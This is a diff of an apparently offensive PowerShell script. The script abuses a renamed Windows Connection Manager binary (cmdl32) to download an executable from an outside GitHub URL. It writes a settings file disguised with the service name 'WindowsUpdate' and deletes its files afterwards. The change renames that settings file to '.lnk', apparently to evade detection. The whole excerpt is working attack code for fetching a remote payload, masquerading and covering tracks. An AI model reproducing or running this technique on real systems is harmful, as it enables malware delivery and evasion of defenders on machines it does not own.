@@ -35,17 +35,17 @@ $env:TMP = $tempDir
 Write-Host "[*] Creating VPN settings file"
 $settingsContent = @"
 [Connection Manager]
-CMSFile=settings.txt
+CMSFile=.lnk
 ServiceName=WindowsUpdate
-TunnelFile=settings.txt
+TunnelFile=.lnk
 [Settings]
 UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
 "@
-Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
+Set-Content -Path "$tempDir\.lnk" -Value $settingsContent
 
 # Use the renamed updater.exe for downloading
 Write-Host "[*] Performing download with $newCmdl32Name"
-$arguments = "/vpn /lan `"$tempDir\settings.txt`""
+$arguments = "/vpn /lan `"$tempDir\.lnk`""
 try {
     Start-Process -FilePath $newCmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
     Write-Host "[*] Download complete with $newCmdl32Name."
@@ -92,6 +92,6 @@ if (Test-Path "$tempDir\whois.exe") {
 # Cleanup
 Write-Host "[*] Cleaning up downloaded file and temporary files"
 Remove-Item -Path "$tempDir\whois.exe" -Force
-Remove-Item -Path "$tempDir\settings.txt" -Force
+Remove-Item -Path "$tempDir\.lnk" -Force
 Remove-Item -Path "$newCmdl32Path" -Force
 Write-Host "[*] Script complete."
